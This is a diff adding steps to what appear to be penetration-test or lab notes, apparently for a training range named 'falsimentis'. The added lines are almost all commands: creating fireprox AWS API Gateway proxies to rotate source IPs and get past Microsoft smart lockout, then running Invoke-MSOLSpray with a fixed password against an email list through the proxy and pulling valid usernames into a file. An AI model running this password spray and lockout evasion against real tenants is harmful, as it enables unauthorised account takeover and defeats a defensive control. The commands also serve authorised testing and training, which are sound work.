@@ -29,5 +29,17 @@ Invoke-MSOLSpray -UserList ./email.txt -Password Dodgers2020
 smartlock will lock these so instead let's use fireprox
 
 ```
+sudo fire.py --command create --url http://myip.sunsetisp.com
+curl http://32ptk9jqm0.execute-api.us-east-1.amazonaws.com/
+sudo fire.py --command delete --api_id 32ptk9jqm0
+```
 
+now use fireprox to create a microsoft login and run the spray against it
+
+```
+sudo fire.py --command create --url https://login.microsoft.com
+Invoke-MSOLSpray -UserList ./email.txt -Password Dodgers2020 -URL http://9jb82e7504.execute-api.us-east-1.amazonaws.com/ -OutFile ~/msolspray.txt
+Get-Content ~/msolspray.txt
+Get-Content ~/msolspray.txt | ForEach { ($_ -split ' ')[6] }
+Get-Content ~/msolspray.txt | ForEach { ($_ -split ' ')[6] } | Out-File ~/falsimentis-valid-users.txt
 ```
